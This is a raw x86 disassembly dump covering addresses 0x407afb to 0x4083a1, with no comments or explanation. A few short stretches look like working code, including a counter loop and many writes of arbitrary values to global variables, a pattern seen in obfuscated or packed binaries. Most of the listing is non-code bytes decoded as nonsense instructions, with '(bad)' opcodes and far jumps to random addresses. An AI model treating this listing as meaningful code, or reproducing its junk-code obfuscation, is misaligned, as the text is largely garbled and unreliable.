  407afb:	ds ds pop esi
  407afe:	test   DWORD PTR [eax-0x30],0x46ed5503
  407b05:	scas   al,BYTE PTR es:[edi]
  407b06:	mov    edi,DWORD PTR [eax+0x4d89ceac]
  407b0c:	and    esi,DWORD PTR [ecx]
  407b0e:	inc    ebp
  407b0f:	xchg   ecx,eax
  407b10:	xchg   ecx,eax
  407b11:	out    0x2e,eax
  407b13:	jp     0x407ab3
  407b15:	xor    bl,ch
  407b17:	aas    
  407b18:	push   ds
  407b19:	idiv   BYTE PTR gs:[edx]
  407b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b1d:	xchg   ebp,eax
  407b1e:	ins    BYTE PTR es:[edi],dx
  407b1f:	adc    cl,bh
  407b21:	lods   al,BYTE PTR ds:[si]
  407b23:	push   esi
  407b24:	inc    edi
  407b25:	loopne 0x407abe
  407b27:	adc    esi,DWORD PTR [esi-0x60]
  407b2a:	mov    DWORD PTR [ecx-0x4e],esi
  407b2d:	cmp    BYTE PTR [ebx],0xc8
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0xf8f6a3a4,al
  407ba8:	jp     0x407c20
  407baa:	mov    eax,ds:0x7e7ecb78
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407b88
  407bb4:	sahf   
  407bb5:	mov    ebp,0x126b5b48
  407bba:	lods   eax,DWORD PTR ds:[esi]
  407bbb:	push   esp
  407bbc:	dec    ebp
  407bbd:	adc    al,BYTE PTR [ecx-0x68f0743]
  407bc3:	xchg   edi,eax
  407bc4:	mov    al,ds:0x847bf9f2
  407bc9:	std    
  407bca:	fiadd  WORD PTR [ecx]
  407bcc:	daa    
  407bcd:	fild   QWORD PTR [esi+esi*1-0x5a]
  407bd1:	push   0xcdec13aa
  407bd6:	jae    0x407c53
  407bd8:	mov    gs:0xdb2d7288,al
  407bde:	or     eax,0xce15186a
  407be3:	call   0xd53a:0x35bd8cbb
  407bea:	fisttp WORD PTR [ebx+0x6a]
  407bed:	and    eax,0xcb3fc0d8
  407bf2:	jp     0x407c4d
  407bf4:	(bad)  
  407bf6:	and    BYTE PTR [edi+0x6c],al
  407bf9:	stos   BYTE PTR es:[edi],al
  407bfa:	dec    BYTE PTR [ebx]
  407bfc:	daa    
  407bfd:	pop    esp
  407bfe:	add    eax,0x98113e99
  407c03:	mov    dh,0x4b
  407c05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c06:	scas   eax,DWORD PTR es:[edi]
  407c07:	arpl   WORD PTR [ebp+0x30c0f79d],sp
  407c0d:	fbstp  TBYTE PTR ds:[eax+0x7a32a059]
  407c14:	add    al,0x6f
  407c16:	jp     0x407bac
  407c18:	or     al,0x31
  407c1a:	mov    ds:0x7da7c05b,al
  407c1f:	mov    eax,ds:0x2234153f
  407c24:	mov    WORD PTR [ebp+edi*8+0x306b029e],es
  407c2b:	xor    bl,BYTE PTR ss:[esi-0x5417f91f]
  407c32:	shr    DWORD PTR [ecx-0x43],0x1a
  407c36:	jmp    0xf78ad749
  407c3b:	in     eax,0x63
  407c3d:	adc    DWORD PTR [ebp+edi*8+0x38],ebp
  407c41:	sub    ah,BYTE PTR [edi+0x68]
  407c44:	in     al,dx
  407c45:	fsubr  DWORD PTR [eax]
  407c47:	mov    al,ds:0x78709af7
  407c4c:	cmp    DWORD PTR [eax+0x4ca2adb4],0xfffffff4
  407c53:	cmp    eax,0xbfc24149
  407c58:	push   ds
  407c59:	retf   0xd65c
  407c5c:	mov    BYTE PTR [eax],dh
  407c5e:	in     al,dx
  407c5f:	mov    gs,ebx
  407c61:	sbb    esp,0xf4b1c2cb
  407c67:	jle    0x407c4e
  407c69:	inc    edi
  407c6a:	mov    DWORD PTR [ecx],0x51a9b52a
  407c70:	pushf  
  407c71:	adc    BYTE PTR [ecx],cl
  407c73:	mov    BYTE PTR [edx+0x4f837e63],bh
  407c79:	mov    ah,0x8f
  407c7b:	dec    esp
  407c7c:	ins    BYTE PTR es:[edi],dx
  407c7d:	inc    esi
  407c7e:	push   esp
  407c7f:	pop    ds
  407c80:	push   ds
  407c81:	dec    eax
  407c82:	pop    es
  407c83:	push   edi
  407c84:	cmp    bl,dh
  407c86:	mov    dl,0xff
  407c88:	inc    ebp
  407c89:	cld    
  407c8a:	mov    dh,cl
  407c8c:	xchg   ebx,eax
  407c8d:	add    DWORD PTR [ebx],0xffffffa9
  407c90:	lds    ecx,FWORD PTR [eiz*8-0x7a9cb14e]
  407c97:	jle    0x407c3b
  407c99:	std    
  407c9a:	test   eax,0x25dc0948
  407c9f:	pop    esp
  407ca0:	int    0xf6
  407ca2:	pop    es
  407ca3:	cdq    
  407ca4:	sbb    ch,ch
  407ca6:	jg     0x407cd5
  407ca8:	push   es
  407ca9:	cdq    
  407caa:	sub    al,0xc
  407cad:	sub    BYTE PTR [eax-0x13fd6f7],dh
  407cb3:	mov    eax,0x5452204e
  407cb8:	pop    ds
  407cb9:	xlat   BYTE PTR ds:[ebx]
  407cba:	scas   eax,DWORD PTR es:[edi]
  407cbb:	jne    0x407c5b
  407cbd:	imul   esp,DWORD PTR ds:0xbb10d93a,0xaa1cdcc5
  407cc7:	shr    DWORD PTR [esi],cl
  407cc9:	xor    ecx,DWORD PTR [ebp+0x29e4bddf]
  407ccf:	and    eax,esp
  407cd1:	das    
  407cd2:	bound  ebx,QWORD PTR [edi+0x1a]
  407cd5:	dec    ecx
  407cd6:	int    0xf
  407cd8:	xchg   ebx,eax
  407cd9:	mov    ebp,0x113d181f
  407cde:	mov    edx,0x553d4233
  407ce3:	mov    ah,0xcd
  407ce5:	xlat   BYTE PTR ds:[ebx]
  407ce6:	jae    0x407d65
  407ce8:	fist   WORD PTR [edi-0x2c]
  407ceb:	fadd   QWORD PTR [ebp+0x66311e2f]
  407cf1:	test   DWORD PTR [ecx+0x2a3f2336],edx
  407cf7:	mov    ebp,0x53e05943
  407cfc:	outs   dx,DWORD PTR ds:[esi]
  407cfd:	pop    esi
  407cfe:	jl     0x407d7e
  407d00:	std    
  407d01:	pop    esp
  407d02:	push   0xffffff8b
  407d04:	mov    bh,0x88
  407d06:	xor    eax,0xbe016af
  407d0b:	mov    ebp,ebp
  407d0d:	mov    ah,BYTE PTR [edx-0x18]
  407d10:	sbb    al,0x8
  407d12:	mov    ch,bl
  407d14:	inc    ebp
  407d15:	mov    DWORD PTR [edi-0x71fbecc],0x3d46d848
  407d1f:	ja     0x407d80
  407d21:	jmp    0x830a:0x4e874881
  407d28:	sub    dh,cl
  407d2a:	mov    esp,0xa5616be9
  407d2f:	lea    ebx,[esi]
  407d31:	popa   
  407d32:	adc    al,0xd6
  407d34:	add    esi,DWORD PTR [edi]
  407d36:	scas   al,BYTE PTR es:[edi]
  407d37:	cmc    
  407d38:	jmp    0xeff5:0x4906d4c6
  407d3f:	out    dx,eax
  407d40:	sub    al,0xd3
  407d42:	cmp    BYTE PTR [ebx-0x20],ah
  407d45:	or     al,BYTE PTR [esi-0x221f2200]
  407d4b:	sub    esp,esp
  407d4d:	test   eax,0x2392ed9a
  407d52:	lahf   
  407d53:	addr16 jmp 0x155:0x700c
  407d5a:	cmp    eax,0x1f5ad61
  407d5f:	inc    ebx
  407d60:	jno    0x407d21
  407d62:	repnz sub esi,ecx
  407d65:	xchg   ebx,eax
  407d66:	mov    ds:0xd5fff355,eax
  407d6b:	cmp    eax,0xb1241392
  407d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d71:	sbb    DWORD PTR [eax-0x6350508e],edx
  407d77:	dec    ebx
  407d78:	ror    DWORD PTR [edi],1
  407d7a:	es hlt 
  407d7c:	test   eax,0x6344b6f0
  407d81:	jne    0x407d4e
  407d83:	mov    ebx,0x120a294d
  407d88:	or     al,0x4b
  407d8a:	shr    edi,0x27
  407d8d:	and    al,0x5f
  407d8f:	pop    edx
  407d90:	adc    ch,BYTE PTR [edi]
  407d92:	cmp    eax,0x9e4f0420
  407d97:	in     eax,0xd3
  407d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d9a:	sahf   
  407d9b:	cmp    BYTE PTR [edi*1-0x57c28f52],al
  407da2:	into   
  407da3:	sar    DWORD PTR [ebp+0x56f092a1],cl
  407da9:	jnp    0x407d54
  407dab:	test   BYTE PTR [ebp+0x1709c9f8],cl
  407db1:	shr    BYTE PTR ds:0x56f56891,1
  407db7:	adc    eax,0x2743831a
  407dbc:	mov    BYTE PTR [edi-0x2c],al
  407dbf:	enter  0x5d04,0xe8
  407dc3:	mov    WORD PTR [esi+0x48],ds
  407dc6:	mov    ds:0x1eb7b59d,eax
  407dcb:	adc    ebp,ebp
  407dcd:	retf   
  407dce:	loopne 0x407de0
  407dd0:	push   ebp
  407dd1:	pop    ebp
  407dd2:	jmp    0x8d88:0x7ac00941
  407dd9:	xor    bh,BYTE PTR [ebx+0x4fb09519]
  407ddf:	stc    
  407de0:	dec    edi
  407de1:	loopne 0x407e0c
  407de3:	fisubr WORD PTR [ebx]
  407de5:	adc    ecx,eax
  407de7:	scas   al,BYTE PTR es:[edi]
  407de8:	inc    ecx
  407de9:	stos   DWORD PTR es:[edi],eax
  407dea:	push   cs
  407deb:	sbb    BYTE PTR [ebp-0x6e],bl
  407dee:	push   0x92483878
  407df3:	ins    DWORD PTR es:[edi],dx
  407df4:	ins    DWORD PTR es:[edi],dx
  407df5:	inc    ebp
  407df6:	out    dx,eax
  407df7:	jle    0x407d8e
  407df9:	pusha  
  407dfa:	daa    
  407dfb:	jbe    0x407d94
  407dfd:	xor    eax,0x10f795ca
  407e02:	xor    edi,DWORD PTR [bx+di]
  407e05:	gs adc eax,0xd75d5c67
  407e0b:	inc    edx
  407e0c:	pop    esp
  407e0d:	dec    edi
  407e0e:	push   ss
  407e0f:	pmaxub mm5,QWORD PTR [ebx]
  407e12:	sahf   
  407e13:	mov    edi,0x474023fa
  407e18:	sbb    al,0x22
  407e1a:	xchg   DWORD PTR [esi+0x5078995e],edi
  407e20:	sub    ebp,DWORD PTR [edx]
  407e22:	jmp    0x3b7a2edc
  407e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e28:	cmp    DWORD PTR [edx],ebp
  407e2a:	jnp    0x407e04
  407e2c:	jmp    0xe4a97008
  407e31:	mov    ds:0xa2472ee5,eax
  407e36:	xchg   edi,eax
  407e37:	push   eax
  407e38:	nop    edx
  407e3b:	loop   0x407e10
  407e3d:	std    
  407e3e:	add    al,BYTE PTR [eax-0x43c3eb4a]
  407e44:	stos   DWORD PTR es:[edi],eax
  407e45:	pop    ecx
  407e46:	mov    ds:0x3f19fe7b,al
  407e4b:	inc    esi
  407e4c:	sbb    BYTE PTR [ebx-0x1871c5db],al
  407e52:	xchg   esp,eax
  407e53:	jp     0x407e89
  407e55:	pop    ds
  407e56:	popf   
  407e57:	jp     0x407e26
  407e59:	es cli 
  407e5b:	in     eax,0xe9
  407e5d:	ins    BYTE PTR es:[edi],dx
  407e5e:	inc    ebx
  407e5f:	jo     0x407e52
  407e61:	shl    ecx,cl
  407e63:	fstp   QWORD PTR [ebx]
  407e65:	sub    bl,BYTE PTR [edx-0x6e]
  407e68:	pop    ebx
  407e69:	jecxz  0x407ec5
  407e6b:	loope  0x407e55
  407e6d:	mov    esp,0x4658431d
  407e72:	(bad)  
  407e73:	aad    0x8c
  407e75:	lock pop edx
  407e77:	je     0x407eae
  407e79:	fist   DWORD PTR [esi]
  407e7b:	adc    al,BYTE PTR [esi]
  407e7d:	addr16 jb 0x407eea
  407e80:	ins    DWORD PTR es:[edi],dx
  407e81:	test   eax,0x4a39036
  407e86:	jae    0x407e36
  407e88:	dec    edi
  407e89:	mov    esp,0xf5efde61
  407e8e:	(bad)  
  407e8f:	lock push esp
  407e91:	retf   0x417f
  407e94:	nop
  407e95:	pop    esp
  407e96:	mov    edi,0x9a663d55
  407e9b:	lock pop eax
  407e9d:	sar    BYTE PTR [edi+0x40],1
  407ea0:	jo     0x407f04
  407ea2:	push   ss
  407ea3:	dec    edx
  407ea4:	xor    eax,DWORD PTR [ebp-0x6d691cf0]
  407eaa:	pop    ebp
  407eab:	sbb    dh,BYTE PTR [esi]
  407ead:	xchg   edi,eax
  407eae:	xchg   esi,eax
  407eaf:	lods   eax,DWORD PTR ds:[esi]
  407eb0:	jmp    0x407ea7
  407eb2:	imul   edi,DWORD PTR [esi+0x4f691a49],0x53
  407eb9:	rcr    DWORD PTR [edi],cl
  407ebb:	add    bl,BYTE PTR [edx]
  407ebd:	and    BYTE PTR [ebp+0x370b440d],bl
  407ec3:	fist   DWORD PTR [ebx+0x108d87a0]
  407ec9:	pop    esp
  407eca:	adc    ebp,DWORD PTR [ebx+0x51]
  407ecd:	pop    es
  407ece:	push   ds
  407ecf:	jbe    0x407ec5
  407ed1:	clc    
  407ed2:	imul   ebx,DWORD PTR [edx+0x3aef5755],0xe9dd2439
  407edc:	and    ebp,DWORD PTR [eax-0x7ed8c298]
  407ee2:	jne    0x407ee0
  407ee4:	mov    eax,0x660e149e
  407ee9:	mov    eax,DWORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43376f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	sub    ecx,ebx
  407f1f:	imul   esi,DWORD PTR ds:0x7e7ed62a,0x7e7e7fe4
  407f29:	and    DWORD PTR [ecx+0x1145a9df],0xffffff95
  407f30:	jecxz  0x407f78
  407f32:	sbb    al,0x7
  407f34:	daa    
  407f35:	push   0x8c8292cc
  407f3a:	loope  0x407ee4
  407f3c:	(bad)  
  407f3d:	jb     0x407ed9
  407f3f:	mov    dh,0xdf
  407f41:	mov    DWORD PTR [edi+0x23904e69],ebp
  407f47:	adc    eax,0x4776d9e4
  407f4c:	and    esi,DWORD PTR [eax-0x10c1c939]
  407f52:	push   ebp
  407f53:	lods   eax,DWORD PTR ds:[esi]
  407f54:	out    0xa5,eax
  407f56:	pushf  
  407f57:	ds cmc 
  407f59:	push   edx
  407f5a:	inc    esp
  407f5b:	addr16 loop 0x407fc3
  407f5e:	jp     0x407f29
  407f60:	sub    eax,0xf8bd87c6
  407f65:	sbb    bh,BYTE PTR [ecx]
  407f67:	sub    edi,DWORD PTR [edx]
  407f69:	and    dl,BYTE PTR [edx-0x4f]
  407f6c:	in     al,dx
  407f6d:	neg    BYTE PTR [ecx-0x33]
  407f70:	in     al,0x1
  407f72:	stos   DWORD PTR es:[edi],eax
  407f73:	and    eax,ecx
  407f75:	ret    
  407f76:	xor    al,0x50
  407f78:	sbb    ecx,DWORD PTR [ecx+0x4095466]
  407f7e:	jae    0x407fd9
  407f80:	cmp    bh,dl
  407f82:	icebp  
  407f83:	sbb    eax,0xe0cb97da
  407f88:	fptan  
  407f8a:	fwait
  407f8b:	cmp    DWORD PTR [ecx+eiz*8-0x7c],esp
  407f8f:	push   es
  407f90:	loopne 0x407f8f
  407f92:	push   DWORD PTR ds:0xe6d5e66b
  407f98:	call   0xd954ad68
  407f9d:	mov    eax,ds:0x3e13a243
  407fa2:	in     eax,dx
  407fa3:	mov    ch,0xf3
  407fa5:	cmp    eax,0xfec55b50
  407faa:	adc    al,BYTE PTR [ebp-0x5]
  407fad:	add    edi,ecx
  407faf:	enter  0xa3f6,0xda
  407fb3:	and    cl,BYTE PTR [ebx-0x14c9be82]
  407fb9:	mov    dh,0x69
  407fbb:	repz ret 
  407fbd:	push   esi
  407fbe:	lods   al,BYTE PTR ds:[esi]
  407fbf:	les    ecx,FWORD PTR [edx-0x55]
  407fc2:	addr16 jl 0x407f5b
  407fc5:	jecxz  0x408009
  407fc7:	inc    edx
  407fc8:	imul   esp,DWORD PTR [ecx+0x1b34d699],0xffffffb7
  407fcf:	xchg   BYTE PTR [eax-0x57cc6459],cl
  407fd5:	xor    al,0x17
  407fd7:	sar    DWORD PTR [ecx],1
  407fd9:	add    edx,eax
  407fdb:	ror    DWORD PTR [edx+0x15],1
  407fde:	jne    0x40805b
  407fe0:	mov    edi,ecx
  407fe2:	push   esi
  407fe3:	in     eax,dx
  407fe4:	push   cs
  407fe5:	push   ebp
  407fe6:	retf   
  407fe7:	cmc    
  407fe8:	ret    
  407fe9:	out    0xcb,eax
  407feb:	jb     0x407fbe
  407fed:	jge    0x407fcb
  407fef:	ret    0xb4a0
  407ff2:	add    BYTE PTR [ecx+0x3dbc1272],bh
  407ff8:	adc    al,0x6c
  407ffa:	stos   BYTE PTR es:[edi],al
  407ffb:	pop    ebx
  407ffc:	pusha  
  407ffd:	ins    BYTE PTR es:[edi],dx
  407ffe:	mov    ebx,0x6079a6b6
  408003:	(bad)  
  408004:	push   edx
  408005:	dec    edx
  408006:	mov    edx,0x81d52896
  40800b:	pusha  
  40800c:	jno    0x407fb9
  40800e:	or     ch,BYTE PTR [ebx-0x27b7f861]
  408014:	or     bh,ch
  408016:	xchg   BYTE PTR [edi+ebx*2+0x47b51701],bl
  40801d:	addr16 mov ecx,0x71c4e8ac
  408023:	(bad)  
  408024:	xor    eax,0x9df74730
  408029:	adc    BYTE PTR [edi-0x35cba4f8],0xfc
  408030:	sub    al,0x2b
  408032:	dec    edi
  408033:	xchg   BYTE PTR [eax-0x7214f8fc],cl
  408039:	mov    ch,0xad
  40803b:	mov    ecx,0xf44fe403
  408040:	outs   dx,DWORD PTR ds:[esi]
  408041:	jae    0x40805b
  408043:	push   ebx
  408044:	pop    ecx
  408045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408046:	inc    edi
  408047:	sbb    ch,BYTE PTR [edx-0x1a2bc7c4]
  40804d:	jecxz  0x4080ab
  40804f:	mov    edi,0x171062af
  408054:	mov    edx,0x3e721cb6
  408059:	lea    edi,[ecx+0x7cc23a0c]
  40805f:	mov    cl,0x6c
  408061:	and    DWORD PTR [esi+edi*2-0x79],eax
  408065:	stos   BYTE PTR es:[edi],al
  408066:	dec    eax
  408067:	and    al,0x3d
  408069:	ficomp WORD PTR [si+0x5d]
  40806d:	sar    ebx,cl
  40806f:	mov    al,ds:0x7e6e9995
  408074:	sbb    DWORD PTR [edx],ebx
  408076:	xor    al,0xe8
  408078:	adc    esp,edi
  40807a:	mov    ebx,0xc4433f49
  40807f:	mov    ah,0x67
  408081:	(bad)  
  408082:	mov    ebp,0x1573033
  408087:	ret    0xa04a
  40808a:	nop
  40808b:	sub    BYTE PTR [edx+0x5e],bh
  40808e:	call   0x45c7:0x8da6aaf2
  408095:	clc    
  408096:	xor    al,BYTE PTR [ebp-0x38be0764]
  40809c:	inc    ebp
  40809d:	in     al,dx
  40809e:	xor    DWORD PTR [ebp+0x77b8f89c],eax
  4080a4:	xchg   ebp,eax
  4080a5:	add    BYTE PTR [eax],al
  4080a7:	mov    ecx,DWORD PTR ds:0x433727
  4080ad:	xor    DWORD PTR ds:0x433833,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433837
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4337fb
  4080d7:	add    ecx,DWORD PTR ds:0x43371b
  4080dd:	mov    DWORD PTR ds:0x4337fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433767,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433783,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43371f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4337b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4337b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4337b3,eax
  408121:	cmp    DWORD PTR ds:0x4337b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4337b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4337b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4337b3
  408158:	inc    eax
  408159:	mov    ds:0x4337b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43376b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0xaca4b68b
  40818c:	fcom   DWORD PTR [eax-0x1b818129]
  408192:	jg     0x408212
  408194:	jle    0x408204
  408196:	test   DWORD PTR [esi+0x2b01c647],eax
  40819c:	sub    eax,0x4bc8910b
  4081a1:	jg     0x408174
  4081a3:	push   es
  4081a4:	scas   eax,DWORD PTR es:[edi]
  4081a5:	xchg   esp,eax
  4081a6:	fdivr  QWORD PTR [esi-0x71557434]
  4081ac:	je     0x40817e
  4081ae:	and    DWORD PTR [esi],eax
  4081b0:	mov    ebx,0x411e4fc8
  4081b5:	and    dl,al
  4081b7:	jnp    0x408170
  4081b9:	aas    
  4081ba:	xor    BYTE PTR [ecx+0x55dbdd09],0xdc
  4081c1:	retf   0xd900
  4081c4:	xchg   ebp,eax
  4081c5:	add    al,0xaa
  4081c7:	sub    BYTE PTR [esi],al
  4081c9:	xchg   edx,eax
  4081ca:	sub    eax,0x2ef1fc6d
  4081cf:	or     DWORD PTR [eax+0x442d3c05],edx
  4081d5:	loop   0x40817f
  4081d7:	out    0x69,al
  4081d9:	lods   eax,DWORD PTR ds:[esi]
  4081da:	cmp    DWORD PTR ds:0xaa80fce8,esp
  4081e0:	inc    ebp
  4081e1:	cli    
  4081e2:	test   eax,0xaeb53887
  4081e7:	js     0x408198
  4081e9:	dec    esi
  4081ea:	(bad)  
  4081eb:	ficomp DWORD PTR [esi+edx*8+0x1d8cc7bc]
  4081f2:	pop    eax
  4081f3:	gs pop edx
  4081f5:	dec    esi
  4081f6:	inc    edi
  4081f7:	cmp    al,0x4e
  4081f9:	mov    ebp,0x65528733
  4081fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ff:	mov    edi,DWORD PTR [edi]
  408201:	mov    ds:0xb4536ddf,al
  408206:	mov    dh,BYTE PTR [ecx+0x2ecb4f1a]
  40820c:	cmp    BYTE PTR [eax],0xfe
  40820f:	adc    al,0x6d
  408211:	pop    eax
  408212:	and    BYTE PTR [edx],dh
  408214:	(bad)  
  408215:	in     al,0xa4
  408217:	data16 cmp al,0x15
  40821a:	push   ss
  40821b:	js     0x408289
  40821d:	inc    ebp
  40821e:	scas   al,BYTE PTR es:[edi]
  40821f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408220:	(bad)
  408223:	lock lds ebx,FWORD PTR [ecx]
  408226:	loopne 0x4081f0
  408228:	adc    eax,0xd220df3
  40822d:	jle    0x4081e5
  40822f:	shl    DWORD PTR [esi-0x55],0xa3
  408233:	xchg   esi,eax
  408234:	pop    ebp
  408235:	imul   esp,DWORD PTR [ebp-0x22],0xffffff8b
  408239:	or     DWORD PTR [ecx],edi
  40823b:	ret    0x324e
  40823e:	xlat   BYTE PTR ds:[ebx]
  40823f:	dec    ebp
  408240:	sub    esp,DWORD PTR [edi]
  408242:	or     ecx,edi
  408244:	or     BYTE PTR [ecx+0x1d],al
  408247:	into   
  408248:	or     BYTE PTR [edi],ch
  40824a:	in     eax,dx
  40824b:	retf   
  40824c:	(bad)  
  40824d:	xlat   BYTE PTR ds:[ebx]
  40824e:	iret   
  40824f:	inc    eax
  408250:	sub    dl,ch
  408252:	cmp    bh,BYTE PTR [ecx]
  408254:	fist   DWORD PTR [ebp+0x38cc706d]
  40825a:	loope  0x408262
  40825c:	or     dh,BYTE PTR [eax-0x71d07fd3]
  408262:	fist   DWORD PTR [edx]
  408264:	mov    al,ds:0xaff65a98
  408269:	or     al,0x57
  40826b:	inc    edx
  40826c:	call   0xe60bec71
  408271:	push   ebp
  408272:	jl     0x408235
  408274:	mov    bl,0x8e
  408276:	jmp    0xd778c33a
  40827b:	inc    esp
  40827c:	les    esp,FWORD PTR [ebx+0x6c6b12e6]
  408282:	aaa    
  408283:	mov    edx,0xe24d0460
  408288:	adc    BYTE PTR [ebp-0x7],dl
  40828b:	jbe    0x408229
  40828d:	sar    cl,1
  40828f:	test   BYTE PTR [ecx+0x17358d30],al
  408295:	push   ss
  408296:	or     eax,0x3d339feb
  40829b:	push   ebp
  40829c:	lods   al,BYTE PTR ds:[esi]
  40829d:	loop   0x4082ed
  40829f:	sub    esp,edi
  4082a1:	mov    al,0xcb
  4082a3:	pop    ebp
  4082a4:	jp     0x4082e5
  4082a6:	in     eax,0x31
  4082a8:	lock sub eax,0xed0790cd
  4082ae:	mov    al,0x5f
  4082b0:	add    ecx,DWORD PTR [esi]
  4082b2:	retf   0x5da8
  4082b5:	popa   
  4082b6:	mov    edi,0x44720d8b
  4082bb:	(bad)  
  4082bc:	xchg   BYTE PTR [ecx],bh
  4082be:	jbe    0x40827c
  4082c0:	je     0x408303
  4082c2:	sahf   
  4082c3:	mov    esp,0x161cc2a6
  4082c8:	xlat   BYTE PTR ds:[ebx]
  4082c9:	push   es
  4082ca:	pop    ebp
  4082cb:	jns    0x408288
  4082cd:	adc    DWORD PTR [eax],esp
  4082cf:	and    bl,bl
  4082d1:	setne  BYTE PTR [ebp-0x68]
  4082d5:	inc    ebp
  4082d6:	and    al,0x90
  4082d8:	or     eax,0xf59510c
  4082dd:	rcr    eax,0x71
  4082e0:	push   0x6fe83b98
  4082e5:	mov    ebp,0xc886aa8e
  4082ea:	aam    0x94
  4082ec:	cmp    DWORD PTR [eax],ecx
  4082ee:	push   0x166584fd
  4082f3:	loope  0x40833e
  4082f5:	stos   BYTE PTR es:[edi],al
  4082f6:	mov    dl,0xe2
  4082f8:	leave  
  4082f9:	xor    al,al
  4082fb:	xchg   esp,eax
  4082fc:	iret   
  4082fd:	xchg   edx,eax
  4082fe:	sti    
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43377f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433723,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4337af,0x433843
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4337bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43377b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43371b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4337ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433773,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0x222f3872
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x408344
  40838a:	mov    eax,ds:0x906d71da
  40838f:	sbb    BYTE PTR [ecx],dh
  408391:	inc    ebx
  408392:	pop    esi
  408393:	popa   
  408394:	clc    
  408395:	xchg   BYTE PTR [eax+0x1a],dl
  408398:	out    dx,al
  408399:	pop    edi
  40839a:	or     al,BYTE PTR [eax-0x28]
  40839d:	pusha  
  40839e:	shr    BYTE PTR [ebp-0x7c],1
  4083a1:	ret    0x948f
